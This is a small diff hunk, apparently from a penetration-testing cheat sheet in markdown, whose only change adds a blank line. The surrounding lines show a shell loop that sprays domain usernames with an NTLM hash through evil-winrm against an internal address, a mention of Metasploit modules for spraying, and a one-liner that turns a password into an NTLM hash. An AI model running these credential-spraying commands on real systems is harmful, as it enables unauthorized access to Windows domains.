@@ -112,6 +112,7 @@ while read LINE; do sleep 1; echo $LINE "=" && curl -o /dev/null -s -w "%{num_he
 
 **WINRM**
 while read line; do echo $line && ruby evil-winrm.rb -u $line -i 10.10.1.1 -H NTLM; done < /tmp/domain_users.txt > /tmp/log_smb.txt
+
 ```
 
 or just use modules from **Metasploit Framework**. To use spray and avoid interactive login, generate NTLM: **echo -n "password" | iconv -t UTF-16LE | openssl md4**
